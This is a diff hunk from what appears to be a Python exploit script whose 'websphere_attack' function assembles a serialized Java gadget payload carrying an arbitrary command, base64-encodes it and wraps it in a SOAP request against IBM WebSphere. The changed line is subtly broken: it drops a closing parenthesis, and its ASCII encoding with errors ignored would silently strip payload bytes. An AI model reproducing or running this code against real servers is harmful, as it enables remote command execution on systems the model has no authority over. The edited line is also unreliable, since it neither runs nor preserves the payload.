@@ -142,7 +142,7 @@ def websphere_attack(HOST, PORT, SSL_On, _cmd):
     cleng = len(_cmd) # Get the length of the payload
     serObj3 += chr(cleng) + _cmd # Convert the length to byte string, prepend to the payload and concatenate with the serialised payload.
     serObj3 += hex2raw3("740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A") # Complete the payload packet
-    serObjB64_3 = base64.b64encode(serObj3) # Base64 encode the whole payload
+    serObjB64_3 = base64.b64encode(serObj3.encode('ascii', errors='ignore') # Base64 encode the whole payload
     
     body = """<?xml version='1.0' encoding='UTF-8'?>
     <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
